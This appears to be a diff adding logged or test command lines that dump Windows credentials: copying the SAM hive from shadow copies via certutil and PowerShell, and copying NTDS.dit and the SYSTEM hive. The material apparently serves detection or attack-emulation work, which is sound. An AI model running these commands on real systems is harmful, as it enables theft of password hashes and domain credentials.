@@ -1,0 +1,13 @@
+"cmd.exe" /c for /L %%a in (1,1,10) do @(certutil -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%%a\Windows\System32\config\SAM" %%temp%%\SAMvss%%a 2 >nul 2>&1) & dir /B %%temp%%\SAMvss*
+"powershell.exe" & {1..10 | %% {   try { [System.IO.File]::Copy(\""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$_\Windows\System32\config\SAM\"" , \""$env:TEMP\SAMvss$_\"", \""true\"") } catch {}  ls \""$env:TEMP\SAMvss$_\"" -ErrorAction Ignore }}
+certutil  -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM" C:\Users\thaim\AppData\Local\Temp\SAMvss1 2
+certutil  -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy10\Windows\System32\config\SAM" C:\Users\thaim\AppData\Local\Temp\SAMvss10 2
+certutil  -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SAM" C:\Users\thaim\AppData\Local\Temp\SAMvss2 2
+certutil  -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\System32\config\SAM" C:\Users\thaim\AppData\Local\Temp\SAMvss3 2
+certutil  -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4\Windows\System32\config\SAM" C:\Users\thaim\AppData\Local\Temp\SAMvss4 2
+certutil  -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\Windows\System32\config\SAM" C:\Users\thaim\AppData\Local\Temp\SAMvss5 2
+certutil  -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy6\Windows\System32\config\SAM" C:\Users\thaim\AppData\Local\Temp\SAMvss6 2
+certutil  -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy7\Windows\System32\config\SAM" C:\Users\thaim\AppData\Local\Temp\SAMvss7 2
+certutil  -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\Windows\System32\config\SAM" C:\Users\thaim\AppData\Local\Temp\SAMvss8 2
+certutil  -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy9\Windows\System32\config\SAM" C:\Users\thaim\AppData\Local\Temp\SAMvss9 2
+"cmd.exe" /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Windows\Temp\ntds.dit & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Windows\Temp\VSC_SYSTEM_HIVE & reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM_HIVE
